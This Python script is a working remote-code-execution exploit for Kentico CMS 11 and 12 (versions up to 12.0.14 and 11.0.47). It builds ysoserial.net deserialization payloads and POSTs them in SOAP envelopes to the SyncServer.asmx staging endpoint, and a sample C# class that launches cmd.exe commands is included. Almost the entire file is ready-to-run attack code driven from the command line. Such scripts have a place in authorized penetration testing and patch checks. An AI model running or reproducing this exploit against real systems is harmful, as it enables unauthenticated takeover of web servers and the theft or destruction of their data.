#!/usr/bin/env python3

import argparse
import requests
import sys
import subprocess
import re
from pathlib import Path


"""
- Description:
    |_ This exploit is for Kentico 11 & 12 and it exploits the SyncServer.asmx by sending a POST request
        with an XML encoded SOAP payload which is being deserialized to achieve code execution.
        The payload is generated by using the 'ActivitySurrogateSelectorFromFile' gadget  from ysoserial.net.

 + A simple C# system exec code sample could be used to perform system cmd execution in some cases.


- Affected Versions:
    |_ <= 12.0.14 / <= 11.0.47

- Reference:
    |_ https://www.aon.com/cyber-solutions/aon_cyber_labs/unauthenticated-remote-code-execution-in-kentico-cms/

"""

"""
Example C#:

using System;
namespace KenticoExploit
{
    class ExploitClass
    {
        public ExploitClass()
        {
            try
            {
                /* Payload code to be executed. */
                System.Diagnostics.Process.Start("cmd.exe", "/C \"<COMMAND>\"");
            }
            catch (Exception)
            {
            }
        }
    }
}
"""


def asciiiii(): # There must be some ascii art, otherwise it's not a 1337 hack :D
    artz = """

 (    ) )  )   (     ( .     (     (     (     (   ((
 )\  (\(  ((.  )\  ( (\  (   )\    )\    )\   ()) (\()
((_)__)(| ))\ ((_) )\(\  )\ ((_)  ((_)) ((_) ((_)))(_)
| |/ /()\((_))| |_(_)( )((_)(/ |  (|_  )| _ \/ __| __|
|   </ -_) ' \)  _| | _| _ \ | |    / / |   / (__| _|
|_|\_\___|_||_|\__|_|__|___/ |_|   /___||_|_\\___|___|

    """
    print(artz)

def exploit(TARGET, GADGET, CSFILE):

    headers = {"Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": "http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData"}

    try:
        yso_path = Path("./ysoserial/ysoserial.exe")
        run_yso = f"{yso_path} --gadget {GADGET} --formatter SoapFormatter -c {CSFILE} -o raw\r\n\r\n"
        print(f"[+] Running ysoserial -> {run_yso}")

        try:
            if GADGET == "ActivitySurrogateSelectorFromFile":
                r_yso = subprocess.check_output([f"{yso_path}", "-g" f"{GADGET}", "-f", "SoapFormatter", "-c" f"{CSFILE}", "-o", "raw"])
                search_b64 = re.search(r'<SOAP-ENC:Array id=\"ref-3\" xsi:type=\"SOAP-ENC:base64">(.*)</SOAP-ENC:Array>', str(r_yso))
                payload = search_b64.groups()[0]
                #print(search_b64.groups()[0]) # To see just the base64 from yso

                data = f'''<?xml version="1.0" encoding="utf-8"?>
                <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                   <soap:Body>
                    <ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
                    <stagingTaskData>
                    <![CDATA[<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                    <SOAP-ENV:Body>
                    <a1:DataSet id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
                    <DataSet.RemotingFormat xsi:type="a1:SerializationFormat" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">Binary</DataSet.RemotingFormat>
                    <DataSet.DataSetName id="ref-3"></DataSet.DataSetName>
                    <DataSet.Namespace href="#ref-3"/>
                    <DataSet.Prefix href="#ref-3"/>
                    <DataSet.CaseSensitive>false</DataSet.CaseSensitive>
                    <DataSet.LocaleLCID>1033</DataSet.LocaleLCID>
                    <DataSet.EnforceConstraints>false</DataSet.EnforceConstraints>
                    <DataSet.ExtendedProperties xsi:type="xsd:anyType" xsi:null="1"/>
                    <DataSet.Tables.Count>1</DataSet.Tables.Count>
                    <DataSet.Tables_0 href="#ref-4"/>
                    </a1:DataSet>
                    <SOAP-ENC:Array id="ref-4" xsi:type="SOAP-ENC:base64">{payload}</SOAP-ENC:Array>
                    </SOAP-ENV:Body>
                    </SOAP-ENV:Envelope>]]>
                    </stagingTaskData>
                   </ProcessSynchronizationTaskData>
                  </soap:Body>
                </soap:Envelope>'''

                #print(data) #Uncomment to view payload

                print(f"[+] Sending exploit to target -> {TARGET}\r\n")

                request1 = requests.post(f"{TARGET}/CMSPages/Staging/SyncServer.asmx", headers=headers, data=data)

                print(f"Status code: -> {request1.status_code}")
                print(f"Response body: -> \r\n{request1.content}\r\n\r\n")

            elif GADGET == "WindowsIdentity":
                r_yso2 = subprocess.check_output([f"{yso_path}", "-g" f"{GADGET}", "-f", "SoapFormatter", "-c" f"{CSFILE}", "-o", "raw"])
                search2_b64 = re.search(r'<System\.Security\.ClaimsIdentity\.actor xsi:type=\"xsd:string\" xmlns=\"\">(.*)</System\.Security\.ClaimsIdentity\.actor>', str(r_yso2))
                payload2 = search2_b64.groups()[0]
                #print(search2_b64.groups()[0]) # To see just the base64 from yso

                data2 = f'''<?xml version="1.0" encoding="utf-8"?>
                <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                   <soap:Body>
                    <ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
                    <stagingTaskData>
                    <![CDATA[<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                    <SOAP-ENV:Body>
                    <a1:DataSet id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
                    <DataSet.RemotingFormat xsi:type="a1:SerializationFormat" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">Binary</DataSet.RemotingFormat>
                    <DataSet.DataSetName id="ref-3"></DataSet.DataSetName>
                    <DataSet.Namespace href="#ref-3"/>
                    <DataSet.Prefix href="#ref-3"/>
                    <DataSet.CaseSensitive>false</DataSet.CaseSensitive>
                    <DataSet.LocaleLCID>1033</DataSet.LocaleLCID>
                    <DataSet.EnforceConstraints>false</DataSet.EnforceConstraints>
                    <DataSet.ExtendedProperties xsi:type="xsd:anyType" xsi:null="1"/>
                    <DataSet.Tables.Count>1</DataSet.Tables.Count>
                    <DataSet.Tables_0 href="#ref-4"/>
                    </a1:DataSet>
                    <SOAP-ENC:Array id="ref-4" xsi:type="SOAP-ENC:base64">{payload2}</SOAP-ENC:Array>
                    </SOAP-ENV:Body>
                    </SOAP-ENV:Envelope>]]>
                    </stagingTaskData>
                   </ProcessSynchronizationTaskData>
                  </soap:Body>
                </soap:Envelope>'''

                #print(data2) #Uncomment to view payload

                print(f"[+] Sending exploit to target -> {TARGET}")

                request2 = requests.post(f"{TARGET}/CMSPages/Staging/SyncServer.asmx", headers=headers, data=data2)

                print(f"Status code: -> {request2.status_code}")
                print(f"Response body: -> \r\n{request2.content}\r\n\r\n")

            else:
                r_yso3 = subprocess.check_output([f"{yso_path}", "-g" f"{GADGET}", "-f", "SoapFormatter", "-c" f"{CSFILE}", "-o", "raw"])
                print(r_yso3)
                payload3 = input("\r\n\r\n[*] Copy/Paste the base64 string from ysoserial.net: \r\n")

                data3 = f'''<?xml version="1.0" encoding="utf-8"?>
                <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                   <soap:Body>
                    <ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
                    <stagingTaskData>
                    <![CDATA[<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                    <SOAP-ENV:Body>
                    <a1:DataSet id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
                    <DataSet.RemotingFormat xsi:type="a1:SerializationFormat" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">Binary</DataSet.RemotingFormat>
                    <DataSet.DataSetName id="ref-3"></DataSet.DataSetName>
                    <DataSet.Namespace href="#ref-3"/>
                    <DataSet.Prefix href="#ref-3"/>
                    <DataSet.CaseSensitive>false</DataSet.CaseSensitive>
                    <DataSet.LocaleLCID>1033</DataSet.LocaleLCID>
                    <DataSet.EnforceConstraints>false</DataSet.EnforceConstraints>
                    <DataSet.ExtendedProperties xsi:type="xsd:anyType" xsi:null="1"/>
                    <DataSet.Tables.Count>1</DataSet.Tables.Count>
                    <DataSet.Tables_0 href="#ref-4"/>
                    </a1:DataSet>
                    <SOAP-ENC:Array id="ref-4" xsi:type="SOAP-ENC:base64">{payload3}</SOAP-ENC:Array>
                    </SOAP-ENV:Body>
                    </SOAP-ENV:Envelope>]]>
                    </stagingTaskData>
                   </ProcessSynchronizationTaskData>
                  </soap:Body>
                </soap:Envelope>'''

                #print(data3) #Uncomment to view payload

                print(f"[+] Sending exploit to target -> {TARGET}\r\n\r\n")

                request3 = requests.post(f"{TARGET}/CMSPages/Staging/SyncServer.asmx", headers=headers, data=data3)

                print(f"Status code: -> {request3.status_code}")
                print(f"Response body: -> \r\n{request3.content}\r\n\r\n")

        except KeyboardInterrupt:
                print("[-] Interrupt signal captured...")
                sys.exit(1)

    except Exception as e:
        print(f"[-] ERROR -> {e}")
        sys.exit(1)

#Function to process arguments
def parse_args():

    parser = argparse.ArgumentParser(description='Kentico 11/12 Arbitrary Code Execution via SyncServer')
    parser.add_argument("-t", "--target",
    					help="Target IP/HOSTNAME\r\n\r\nExample: exploit.py -t/--target http/s://contoso.com:[80/443]",
    					type=str)#,
                        #required=True)
    parser.add_argument("-g", "--gadget",
                        help="Gadget to use [Known to work: ActivitySurrogateSelectorFromFile, WindowsIdentity] others might work too, try them...",
                        type=str)#,
                        #required=True)
    parser.add_argument("-c", "--csfile",
                        help='Exploit C# file or powershell/cmd command\r\nExample: "C:/KenticoExploit/exploit.cs;System.dll"')#,
                        #required=True)
    args = parser.parse_args(args=None if sys.argv[1:] else ['--help']) #Show help menu if no arguments provided

    if not args.target or not args.gadget or not args.csfile:
        parser.error("WARNING -> Gadget and/or file/command must be provided...")
        sys.exit(1)
    else:
        GADGET = str(args.gadget)
        CSFILE = str(args.csfile)
        TARGET = str(args.target)
        exploit(TARGET, GADGET, CSFILE)

if __name__ == "__main__":
    try:
        asciiiii()
        parse_args()
    except Exception as e:
        print(f"[-] ERROR -> {e}")
        sys.exit(1)
